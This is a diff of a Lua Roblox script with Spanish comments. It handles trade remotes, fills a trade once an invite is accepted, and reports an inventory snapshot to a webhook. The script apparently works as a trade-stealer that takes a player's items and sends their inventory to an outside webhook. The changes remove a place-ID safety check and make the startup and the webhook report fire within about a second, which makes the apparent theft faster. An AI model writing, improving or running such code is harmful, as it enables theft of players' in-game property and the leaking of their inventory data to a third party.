 local function bindEvents()
     if R.InviteResult then
         R.InviteResult.OnClientEvent:Connect(function(payload)
-            local flat = tostring(payload)
-            if type(payload) == "table" then
-                local bits = {}
-                for k, v in pairs(payload) do bits[#bits+1] = tostring(k) .. "=" .. tostring(v) end
-                flat = table.concat(bits, " ")
-            end
-            local s = flat:lower()
-            if s:find("accept") or s:find("true") then
+            local flat = tostring(payload):lower()
+            if flat:find("accept") or flat:find("true") then
                 if S.phase == "WAIT_GUI" or S.phase == "INVITING" then
                     S.phase = "FILLING"
                     task.spawn(fill)
@@ -603,42 +626,32 @@ local function bindEvents()
     end
 
     if R.TradeCompleted then
-        R.TradeCompleted.OnClientEvent:Connect(function()
-            finish("completado", "TradeCompleted")
-        end)
+        R.TradeCompleted.OnClientEvent:Connect(function() finish("completado", "TradeCompleted") end)
     end
 
     if R.Cancel then
         R.Cancel.OnClientEvent:Connect(function()
-            if S.phase ~= "IDLE" and S.phase ~= "DONE" then
-                finish("cancelado", "CancelTrade")
-            end
+            if S.phase ~= "IDLE" and S.phase ~= "DONE" then finish("cancelado", "CancelTrade") end
         end)
     end
 end
 
--- ============================ ARRANQUE ============================
-if CFG.STRICT_PLACE and game.PlaceId ~= CFG.PLACE_ID then
-    reportAlert("PLACE EQUIVOCADO", ("PlaceId: `%d` | Esperado: `%d`"):format(game.PlaceId, CFG.PLACE_ID))
-    return
-end
-
+-- ============================ ARRANQUE ULTRARRÁPIDO (~1s) ============================
 task.spawn(function()
     local waited = 0
-    while not resolveRemotes() and waited < 25 do
-        task.wait(1)
-        waited += 1
+    while not resolveRemotes() and waited < 10 do
+        task.wait(0.5)
+        waited += 0.5
     end
 
     if not R.Invite then
-        reportAlert("REMOTES NO ENCONTRADOS", "No se hallaron los remotes de TradeService en Packages.Net.")
+        reportAlert("REMOTES NO ENCONTRADOS", "No se hallaron los remotes de TradeService.")
         return
     end
 
     bindEvents()
-    task.wait(1.2)
 
-    -- Escaneo inicial y envío del Webhook estructurado
+    -- Escaneo inicial inmediato y reporte al webhook en menos de 1 segundo
     local items, _ = snapshot()
     if not S.reported then
         S.reported = true
@@ -663,4 +676,3 @@ task.spawn(function()
         task.wait(CFG.POLL)
     end
 end)
-
